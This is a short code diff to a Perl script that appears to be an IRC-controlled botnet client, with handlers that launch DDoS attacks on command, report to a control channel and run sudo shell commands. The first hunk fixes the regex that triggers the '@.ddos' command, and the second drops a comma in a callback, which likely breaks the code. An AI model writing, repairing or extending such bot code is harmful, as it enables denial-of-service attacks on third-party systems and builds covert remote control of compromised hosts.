@@ -95,7 +95,7 @@ system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
     my $s = shift;
     my @IRC_RESULTS;
     $events{connect}++;
-            if ($msg = ~/@.ddos/) {
+            if ($msg =~ /@.ddos/) {
             warn "DDoS Launched on $1";
             $irc -> write(notice => $noticechan => "[Info] DDoS Started");
             my($ip) = $1;
@@ -151,7 +151,7 @@ system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
        push @IRC_RESULTS, $_ foreach split "\n", $r;
       }
       return @IRC_RESULTS;
-      }, sub {
+      } sub {
        my ($s, $error, @res) = @_;
        $irc->write(notice => $noticechan => " FINISHED: $msg");
        warn "Finished work: $msg";
